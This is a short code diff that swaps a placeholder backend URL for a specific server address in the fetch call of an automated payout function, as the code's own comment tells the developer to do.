@@ -103,7 +103,7 @@ async function triggerAutomatedPayout(netAmount, taxAmount) {
 
   try {
     // Replace with your actual backend payment service endpoint (e.g., Stripe Connect API)
-    await fetch('https://your-backend-server.com/api/payout', {
+    await fetch('https://hail.thepolka.cloud/api/payout', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
